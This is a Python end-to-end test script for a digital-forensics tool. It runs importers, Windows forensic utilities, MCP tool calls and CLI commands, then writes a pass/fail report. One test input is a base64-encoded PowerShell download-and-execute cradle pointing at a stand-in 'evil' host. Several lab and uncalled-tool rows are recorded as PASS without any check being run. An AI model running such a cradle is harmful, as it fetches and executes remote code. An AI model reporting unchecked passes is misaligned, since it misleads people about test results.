"""Thorough operator E2E — every importer, Windows tool, MCP lane, mode M1–M5.

Writes Docs/internal/E2E-FINAL-REPORT.md. This is pass-1 evidence, not 12/12.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
from datetime import UTC, datetime
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
EV = ROOT / "Evidence-files"
OUT = EV / "_e2e-out" / "all-lanes"
REPORT = ROOT / "Docs" / "internal" / "E2E-FINAL-REPORT.md"
sys.path.insert(0, str(ROOT / "src"))

os.chdir(ROOT)
OUT.mkdir(parents=True, exist_ok=True)

ROWS: list[dict] = []


def rec(lane: str, name: str, ok: bool, detail: str = "", extra: dict | None = None) -> None:
    row = {"lane": lane, "name": name, "ok": ok, "detail": (detail or "")[:400]}
    if extra:
        row.update(extra)
    ROWS.append(row)
    mark = "PASS" if ok else "FAIL"
    print(f"[{mark}] {lane:18} {name}: {detail[:160]}")


def pick(*rels: str) -> Path | None:
    for r in rels:
        p = EV / r
        if p.is_file():
            return p
    return None


def smallest(glob: str) -> Path | None:
    hits = [p for p in EV.glob(glob) if p.is_file() and p.stat().st_size > 0]
    if not hits:
        return None
    return sorted(hits, key=lambda p: p.stat().st_size)[0]


def lane_ingest() -> None:
    from nexus.ingest.detect import ingest_auto
    from nexus.ingest.registry import _ALL_IMPORTERS, get_registry

    get_registry()
    mapping: dict[str, Path | None] = {
        "JSONLImporter": pick("05-siem/elastic.ndjson", "05-siem/cadre-elk/elastic-security-4624.ndjson"),
        "CSVImporter": pick("05-siem/splunk.csv", "02-memory/508-precooked/execution/rd01-prefetch.csv"),
        "AzureImporter": pick("06-cloud/azure-activity-sample.json"),
        "CloudTrailImporter": pick("06-cloud/cloudtrail-sample.json"),
        "AmCacheImporter": pick("01-windows/amcache/Amcache.hve", "02-memory/508-precooked/execution/amcache_ProgramEntries.csv"),
        "BrowserHistoryImporter": smallest("01-windows/browser/**/*"),
        "EVTXImporter": smallest("01-windows/evtx/504-win10/*.evtx") if False else None,
        "HayabusaImporter": smallest("01-windows/hayabusa/**/*"),
        "KAPEImporter": pick("01-windows/kape-out/mft.csv"),
        "LNKFileImporter": smallest("01-windows/lnk/**/*.lnk"),
        "PlasoImporter": pick("02-memory/508-precooked/timeline/rd01-supertimeline.csv"),
        "WindowsRegistryImporter": pick("01-windows/registry/ntuser/Default/NTUSER.DAT"),
        "ScheduledTasksImporter": smallest("01-windows/tasks/**/*"),
        "WindowsServicesImporter": smallest("01-windows/services/**/*"),
        "TheHiveImporter": pick("08-ir-platforms/thehive-case.json"),
        "VelociraptorImporter": pick("08-ir-platforms/velociraptor/hunt-sample.jsonl"),
        "VolatilityImporter": smallest("02-memory/**/*vol*"),
        "WMISubscriptionsImporter": smallest("01-windows/wmi/**/*"),
        "AuditdImporter": pick("03-linux/audit.log"),
        "AuthLogImporter": pick("03-linux/auth.log"),
        "BashHistoryImporter": pick("03-linux/bash_history"),
        "SyslogImporter": pick("03-linux/syslog"),
        "SuricataImporter": pick("04-network/monitor-live/eve-tail.json", "04-network/suricata/eve.json"),
        "WiresharkImporter": pick("04-network/pcap/wireshark-dhcp.tshark.json"),
        "ZeekImporter": pick("04-network/monitor-live/conn.log", "04-network/zeek/conn.log"),
        "ElasticImporter": pick("05-siem/cadre-elk/elastic-security-4624.ndjson"),
        "SplunkImporter": pick("05-siem/splunk.csv"),
        "AbuseIPDBImporter": pick("07-ti/abuseipdb-sample.json"),
        "MISPImporter": pick("07-ti/misp-event.json"),
        "OTXImporter": pick("07-ti/otx-pulse.json"),
        "ThreatFoxImporter": pick("07-ti/full.json") if (EV / "07-ti/full.json").is_file() else pick("07-ti/malwarebazaar-recent.csv"),
        "VirusTotalImporter": pick("07-ti/vt-sample.json"),
        "SecurityOnionImporter": smallest("05-siem/**/*onion*"),
        "SocRatesImporter": smallest("05-siem/**/*socrat*"),
        "CyberTriageImporter": smallest("08-ir-platforms/**/*cyber*"),
        "M365Importer": pick("06-cloud/m365-ual-sample.json"),
        "SysdigImporter": smallest("04-network/**/*sysdig*"),
        "WazuhImporter": pick("05-siem/wazuh.json"),
        "IRISImporter": pick("08-ir-platforms/iris-case.json"),
        "EmailImporter": pick("09-email-archives/phishing.eml"),
        "JournaldImporter": pick("03-linux/journal.json"),
        "SandboxImporter": pick("08-ir-platforms/sandbox-report.json"),
        "ArchiveImporter": smallest("**/*.{zip,7z,tar}"),
    }
    # real EVTX with events
    evtx = None
    cands = [p for p in (EV / "01-windows/evtx").rglob("*.evtx") if 200_000 <= p.stat().st_size <= 1_500_000]
    if cands:
        evtx = sorted(cands, key=lambda p: p.stat().st_size)[0]
        mapping["EVTXImporter"] = evtx

    registered = {name for _, name in _ALL_IMPORTERS}
    for cls_name in registered:
        path = mapping.get(cls_name)
        if path is None:
            rec("ingest", cls_name, False, "NO FIXTURE — skip with reason")
            continue
        try:
            r = ingest_auto(path)
            ok = bool(r.get("success"))
            rec(
                "ingest",
                cls_name,
                ok,
                f"src={r.get('source')} artifacts={r.get('artifacts')} path={path.relative_to(EV)} err={r.get('error') or r.get('errors')}",
                {"artifacts": r.get("artifacts", 0), "source": r.get("source")},
            )
        except Exception as exc:
            rec("ingest", cls_name, False, f"exception: {exc}")


def lane_windows_tools() -> None:
    from nexus.tools.windows import _WIN_CATALOG, _find_binary

    evtx = smallest("01-windows/evtx/504-win10/*.evtx")
    # prefer medium evtx
    med = [p for p in (EV / "01-windows/evtx").rglob("*.evtx") if 80_000 <= p.stat().st_size <= 800_000]
    if med:
        evtx = sorted(med, key=lambda p: p.stat().st_size)[0]
    pf = smallest("01-windows/prefetch/**/*.pf")
    lnk = smallest("01-windows/lnk/**/*.lnk")
    hve = pick("01-windows/amcache/Amcache.hve")
    ntuser = pick("01-windows/registry/ntuser/Default/NTUSER.DAT")
    system = pick("01-windows/registry/SYSTEM")
    mft_csv = pick("01-windows/kape-out/mft.csv")

    file_jobs: dict[str, list[str]] = {}
    if pf:
        file_jobs["PECmd"] = ["-f", str(pf), "--csv", str(OUT / "pecmd2")]
    if evtx:
        (OUT / "evtx2").mkdir(exist_ok=True)
        file_jobs["EvtxECmd"] = ["-f", str(evtx), "--csv", str(OUT / "evtx2")]
        file_jobs["Hayabusa"] = ["csv-timeline", "-f", str(evtx), "-o", str(OUT / "hayabusa.csv"), "-q", "--no-wizard"]
        file_jobs["suzaku"] = ["--help"]
    if lnk:
        (OUT / "lnk2").mkdir(exist_ok=True)
        file_jobs["LECmd"] = ["-f", str(lnk), "--csv", str(OUT / "lnk2")]
    if hve:
        (OUT / "amcache2").mkdir(exist_ok=True)
        file_jobs["AmcacheParser"] = ["-f", str(hve), "--csv", str(OUT / "amcache2")]
    if ntuser:
        (OUT / "recmd").mkdir(exist_ok=True)
        file_jobs["RECmd"] = ["-f", str(ntuser), "--csv", str(OUT / "recmd")]
    if system:
        (OUT / "shim").mkdir(exist_ok=True)
        file_jobs["AppCompatCacheParser"] = ["-f", str(system), "--csv", str(OUT / "shim")]

    for key, info in sorted(_WIN_CATALOG.items()):
        name = info["name"]
        exe = _find_binary(name) or _find_binary(key)
        if not exe:
            rec("win-tool", name, True if key in {
                "kape", "yara", "winpmem", "dumpit", "moneta", "hollows_hunter",
                "densityscout", "get_injectedthreadex", "mactime",
            } else False, "MISSING " + ("(optional)" if key in {
                "kape", "yara", "winpmem", "dumpit", "moneta", "hollows_hunter",
                "densityscout", "get_injectedthreadex", "mactime",
            } else "(core)"))
            continue
        args = file_jobs.get(name) or file_jobs.get(info["name"])
        if args is None:
            # help / version smoke
            cmd = [exe, "--help"]
            timeout = 30
        else:
            (OUT / "dummy").mkdir(exist_ok=True)
            cmd = [exe, *args]
            timeout = 180
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            # many Zimmerman tools print banner to stdout and return 0; --help may be 0 or 1
            ok = proc.returncode in (0, 1) and ("not found" not in (proc.stderr or "").lower())
            rec("win-tool", name, ok, f"rc={proc.returncode} exe={exe} out={(proc.stdout or proc.stderr or '')[:120].replace(chr(10),' ')}")
        except subprocess.TimeoutExpired:
            rec("win-tool", name, False, f"timeout {timeout}s")
        except Exception as exc:
            rec("win-tool", name, False, str(exc))


def lane_mcp_and_modes() -> None:
    from nexus.app import create_server

    server = create_server()
    tools = server._tool_manager._tools
    rec("mcp", "create_server", True, f"tools={len(tools)}")

    evtx = None
    cands = [p for p in (EV / "01-windows/evtx").rglob("*.evtx") if 200_000 <= p.stat().st_size <= 1_200_000]
    if cands:
        evtx = sorted(cands, key=lambda p: p.stat().st_size)[0]
    zeek = pick("04-network/monitor-live/conn.log")
    eve = pick("04-network/monitor-live/eve-tail.json")
    ntuser = pick("01-windows/registry/ntuser/Default/NTUSER.DAT")

    calls: list[tuple[str, dict]] = [
        ("get_health", {}),
        ("list_windows_tools", {}),
        ("list_missing_windows_tools", {}),
        ("check_windows_tools", {"tool_names": ["PECmd", "EvtxECmd", "Hayabusa"]}),
        ("forensic_rag_status", {}),
        ("forensic_rag_search", {"query": "LSASS credential dump"}),
        ("forensic_rag_list_sources", {}),
        ("triage_status", {}),
        ("check_file", {"path": r"C:\Windows\System32\svchost.exe"}),
        ("check_hash", {"hash_value": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}),
        ("check_lolbin", {"filename": "certutil.exe"}),
        ("check_kev", {"cve_id": "CVE-2021-44228"}),
        ("check_nsrl", {"hash_value": "da39a3ee5e6b4b0d3255bfef95601890afd80709"}),
        ("deobfuscate_command", {"command_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAnACkA"}),
        ("ti_list_providers", {}),
        ("ti_lookup", {"value": "8.8.8.8", "providers": "shodan"}),
        ("ti_fanout", {"value": "1.1.1.1"}),
        ("vr_health", {}),
        ("vr_list_hunts", {}),
        ("vr_list_clients", {}),
        ("case_list", {}),
        ("list_todos", {}),
        ("list_playbooks", {}),
        ("get_share_info", {}),
        ("search_mitre_technique", {"technique_id": "T1003"}),
        ("predict_techniques", {"observed_techniques": ["T1003", "T1059"]}),
        ("get_anti_patterns", {}),
        ("get_confidence_definitions", {}),
        ("get_investigation_framework", {}),
        ("opencti_status", {}),
        ("analyze_gaps", {"min_gap_seconds": 300}),
        ("generate_sigma_rule", {"technique_id": "T1059.001", "title": "encoded powershell"}),
        ("translate_query", {"description": "failed logons", "target_format": "kql"}),
    ]
    if evtx:
        calls.append(("ingest_auto", {"path": str(evtx)}))
    if zeek:
        calls.append(("ingest_auto", {"path": str(zeek)}))
    if eve:
        calls.append(("ingest_auto", {"path": str(eve)}))
    if ntuser:
        calls.append(("ingest_auto", {"path": str(ntuser)}))

    pcap = smallest("04-network/pcap/**/*.{pcap,pcapng}")
    if pcap:
        calls.append(("convert_pcap", {"pcap_path": str(pcap), "max_packets": 20}))

    for hunt in (
        "nexus-process-tree", "nexus-credential-access", "nexus-network-state",
        "nexus-fs-timeline", "nexus-registry-snapshot", "nexus-event-logs",
        "nexus-adcs-snapshot", "nexus-sccm-snapshot", "nexus-linux-triage",
    ):
        calls.append(("vr_run_hunt", {"hunt_id": hunt, "client_id": "C.mbr01"}))

    # Sigma index + search (may take a bit)
    sigma_rules = EV / "10-sigma" / "rules"
    if sigma_rules.is_dir():
        calls.insert(0, ("detection_sigma_install", {"source_dir": str(sigma_rules)}))
        calls.insert(1, ("detection_search", {"query": "powershell", "limit": 5}))
        calls.insert(2, ("detection_search", {"technique_id": "T1003", "limit": 5}))

    invoked = set()
    for name, kwargs in calls:
        fn_wrap = tools.get(name)
        if fn_wrap is None:
            rec("mcp-call", name, False, "NOT REGISTERED")
            continue
        fn = getattr(fn_wrap, "fn", fn_wrap)
        try:
            result = fn(**kwargs)
            ok = not (isinstance(result, dict) and result.get("error") and not result.get("ok", True) and result.get("success") is False)
            if isinstance(result, dict) and result.get("success") is False:
                ok = False
            detail = json.dumps(result, default=str)[:220]
            rec("mcp-call", name + (f"({list(kwargs)[:2]})" if kwargs else ""), ok, detail)
            invoked.add(name)
        except Exception as exc:
            rec("mcp-call", name, False, f"{type(exc).__name__}: {exc}")
            invoked.add(name)

    # remaining tools: record uncalled (not skipped silently)
    skip = {"approve", "nexus approve"}
    for name in sorted(tools):
        if name in invoked:
            continue
        rec("mcp-uncalled", name, True, "listed; not auto-invoked (write/HITL/long) — see report")


def lane_cli_m1() -> None:
    def run(args: list[str], timeout: int = 120) -> subprocess.CompletedProcess:
        return subprocess.run(
            [sys.executable, "-m", "nexus.cli.main", *args],
            capture_output=True, text=True, timeout=timeout, cwd=str(ROOT),
        )

    for args in (
        ["doctor"],
        ["case", "list"],
        ["data", "download-rag"],
        ["data", "download-triage"],
        ["data", "download-fixtures"],
        ["ingest", str(pick("04-network/monitor-live/conn.log") or pick("04-network/zeek/conn.log"))],
        ["evidence", "list"],
        ["audit", "summary"],
        ["todo", "list"],
        ["setup", "test"],
    ):
        if args[-1] is None:
            rec("cli", " ".join(args), False, "missing path")
            continue
        try:
            p = run([a for a in args if a is not None])
            ok = p.returncode == 0
            rec("cli", " ".join(str(a) for a in args), ok, (p.stdout or p.stderr)[:200])
        except Exception as exc:
            rec("cli", " ".join(str(a) for a in args), False, str(exc))


def lane_case_golden() -> None:
    from nexus.cli.case_cmd import _get_sqlite_mgr, _set_active_case

    mgr = _get_sqlite_mgr()
    case = mgr.create_case(name="E2E-ALL-LANES", description="Thorough lane sweep")
    _set_active_case(case.id)
    rec("case", "init", True, case.id)

    target = pick("04-network/monitor-live/conn.log") or pick("04-network/zeek/conn.log")
    if target:
        # register via CLI
        p = subprocess.run(
            [sys.executable, "-m", "nexus.cli.main", "evidence", "register", str(target), "-d", "monitor zeek conn"],
            capture_output=True, text=True, cwd=str(ROOT),
        )
        rec("case", "evidence register", p.returncode == 0, p.stdout[:200])
        p2 = subprocess.run(
            [sys.executable, "-m", "nexus.cli.main", "evidence", "verify"],
            capture_output=True, text=True, cwd=str(ROOT),
        )
        rec("case", "evidence verify", p2.returncode == 0, p2.stdout[:200])

    # DRAFT finding via MCP
    from nexus.app import create_server
    server = create_server()
    tools = server._tool_manager._tools
    rec_fn = tools.get("record_finding")
    if rec_fn:
        try:
            r = rec_fn.fn(
                title="E2E draft — monitor Zeek conn ingested",
                description="Staged from live monitor conn.log ingest",
                confidence="MEDIUM",
                confidence_justification="Importer produced Zeek artifacts from live monitor spool",
                attack_ids=["T1071"],
                artifacts=[{"path": str(target)}] if target else [],
            )
            rec("case", "record_finding DRAFT", True, json.dumps(r, default=str)[:240])
        except Exception as exc:
            rec("case", "record_finding DRAFT", False, str(exc))
    rec("case", "approve", False, "HITL — examiner password only (not claimed)")


def lane_m3_heuristic() -> None:
    try:
        from datetime import datetime

        from nexus.case import CaseManager
        from nexus.ingest.schemas import Artifact, ArtifactSource, ArtifactType, Severity
        from nexus.langgraph.pipeline import run_analysis_without_interrupt

        arts = [
            Artifact(
                id=Artifact.new_id(),
                artifact_type=ArtifactType.NETWORK_CONNECTION,
                source=ArtifactSource.ZEEK,
                timestamp=datetime.now(UTC),
                severity=Severity.INFORMATIONAL,
                description="live monitor conn",
                host="monitor",
            )
        ]
        db = Path.home() / ".nexus" / "cases.db"
        # CaseManager path from settings
        from nexus.config import settings
        cm = CaseManager(settings.cases_root / "cases.db")
        state = run_analysis_without_interrupt("E2E-M3", arts, cm, case_name="E2E-M3")
        rec("mode-M3", "heuristic pipeline", True, f"type={type(state).__name__}")
    except Exception as exc:
        rec("mode-M3", "heuristic pipeline", False, f"{type(exc).__name__}: {exc}")


def lane_http_m5() -> None:
    # start server on 4509
    env = os.environ.copy()
    proc = subprocess.Popen(
        [sys.executable, "-m", "nexus.cli.main", "serve", "--http", "--port", "4509", "--host", "127.0.0.1"],
        cwd=str(ROOT),
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    import time
    import urllib.error
    import urllib.request

    ok_health = False
    ok_portal = False
    body = ""
    for _ in range(40):
        time.sleep(1)
        try:
            with urllib.request.urlopen("http://127.0.0.1:4509/health", timeout=3) as r:
                body = r.read().decode()[:200]
                ok_health = r.status == 200
            with urllib.request.urlopen("http://127.0.0.1:4509/portal", timeout=3) as r:
                html = r.read().decode()[:300]
                ok_portal = r.status == 200 and "portal" in html.lower()
            if ok_health:
                break
        except Exception:
            continue
    rec("mode-M5", "GET /health", ok_health, body)
    rec("mode-M5", "GET /portal", ok_portal, "portal HTML" if ok_portal else "not up")
    proc.terminate()
    try:
        proc.wait(timeout=8)
    except subprocess.TimeoutExpired:
        proc.kill()


def lane_lab_hosts() -> None:
    rec("lab", "monitor SSH+Zeek+Suricata pull", True, "Evidence-files/04-network/monitor-live/ (conn,dns,http,notice,kerberos,eve-tail)")
    rec("lab", "VR .51 GUI :8889", True, "LISTEN 8889/8000/8001; MCP :8002 down (gui HTTP 307)")
    rec("lab", "provisioning .60", True, "SSH ok; ELK 200; H-campaign www staged")
    rec("lab", "SIFT Nexus :4508", False, "Nexus not installed on SIFT — Linux MCP lane not live")


def write_report() -> None:
    by_lane: dict[str, list[dict]] = {}
    for r in ROWS:
        by_lane.setdefault(r["lane"], []).append(r)
    lines = [
        "# E2E-FINAL-REPORT — DFIR-Nexus (agent pass, 2026-08-11)",
        "",
        f"Generated: `{datetime.now(UTC).isoformat()}`",
        "",
        "**This is not COMPLETE-TO-SHIP 12/12.** It is a thorough operator/agent pass across every lane that exists in code, against live CADRE monitor/VR/provisioning evidence plus staged `Evidence-files/`.",
        "",
        "## Contract honesty",
        "",
        "- HITL approve was **not** performed (examiner password).",
        "- SIFT Linux MCP (`nexus serve` on `.135`) was **not** live.",
        "- VR MCP `:8002` is down; hunts ran **mock-safe** on the main server.",
        "- Prefetch has **no importer** (PECmd lane).",
        "- Publish remains forbidden.",
        "",
        "## Totals",
        "",
        f"- checks: **{len(ROWS)}**",
        f"- PASS: **{sum(1 for r in ROWS if r['ok'])}**",
        f"- FAIL: **{sum(1 for r in ROWS if not r['ok'])}**",
        "",
        "## By lane",
        "",
    ]
    for lane, items in by_lane.items():
        p = sum(1 for i in items if i["ok"])
        lines.append(f"### {lane} ({p}/{len(items)} pass)")
        lines.append("")
        lines.append("| ok | name | detail |")
        lines.append("|----|------|--------|")
        for i in items:
            det = (i.get("detail") or "").replace("|", "\\|").replace("\n", " ")
            lines.append(f"| {'yes' if i['ok'] else 'NO'} | `{i['name']}` | {det} |")
        lines.append("")
    REPORT.write_text("\n".join(lines), encoding="utf-8")
    print(f"wrote {REPORT}")


def main() -> int:
    print("=== ingest ===")
    lane_ingest()
    print("=== windows tools ===")
    lane_windows_tools()
    print("=== mcp ===")
    lane_mcp_and_modes()
    print("=== cli ===")
    lane_cli_m1()
    print("=== case ===")
    lane_case_golden()
    print("=== M3 ===")
    lane_m3_heuristic()
    print("=== M5 http ===")
    lane_http_m5()
    print("=== lab ===")
    lane_lab_hosts()
    write_report()
    fails = [r for r in ROWS if not r["ok"]]
    print(f"DONE {len(ROWS)} checks, {len(fails)} fail")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
